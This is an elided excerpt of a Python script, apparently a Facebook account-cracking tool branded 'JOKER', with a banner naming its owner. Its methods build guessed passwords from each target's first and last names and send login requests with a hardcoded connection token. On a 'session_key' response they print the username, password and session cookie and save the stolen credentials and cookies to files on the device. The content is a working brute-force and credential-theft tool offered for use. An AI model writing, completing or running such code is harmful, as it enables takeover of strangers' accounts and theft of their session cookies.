...
\033[1;39m======================================================
\033[1;37m Owner   :     𝐑𝐀𝐘𝐒𝐒 𝐃𝐀 𝐄𝐍𝐐𝐄𝐋𝐀𝐁𝐄 𝐘𝐀𝐑𝐀𝐍 
\033[1;37m Facebook:     𝐑𝐀𝐘𝐒𝐒 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
\033[1;37m Github  :     𝐌𝐑 𝐊𝐎𝐊𝐎 𝐉𝐎𝐊𝐄𝐑
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[JOKER] {loop} | M•1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\033[10;92m\033[1;91m[\033[1;92mJOKER-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mUSER\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[🍪]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                    oks.append(sid)
                    open('/sdcard/JOKER.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JOKER_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[JOKER] {loop} | M•3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[JOKER] {loop} | M•2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[JOKER] {loop} | M•4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
